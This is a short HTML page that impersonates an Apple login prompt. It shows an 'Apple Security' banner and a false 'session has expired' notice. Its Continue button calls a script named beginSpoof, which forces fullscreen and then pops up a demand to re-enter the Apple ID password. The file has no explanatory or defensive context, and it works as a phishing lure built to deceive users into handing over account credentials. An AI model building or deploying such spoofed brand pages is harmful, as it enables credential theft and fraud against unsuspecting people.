<!DOCTYPE html>
<html>
<head>
  <title>Apple Login</title>
  <style>
    body {
      font-family: -apple-system, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
      background: white;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <h2>🔒 Apple Security</h2>
  <p>Your session has expired. Please continue.</p>
  <button onclick="beginSpoof()">Continue</button>

  <script>
    function beginSpoof() {
      document.documentElement.requestFullscreen().then(() => {
        setTimeout(() => {
          alert("🔐 Apple ID verification required.\nPlease re-enter your password.");
        }, 1000);
      }).catch(console.error);
    }
  </script>
</body>
</html>
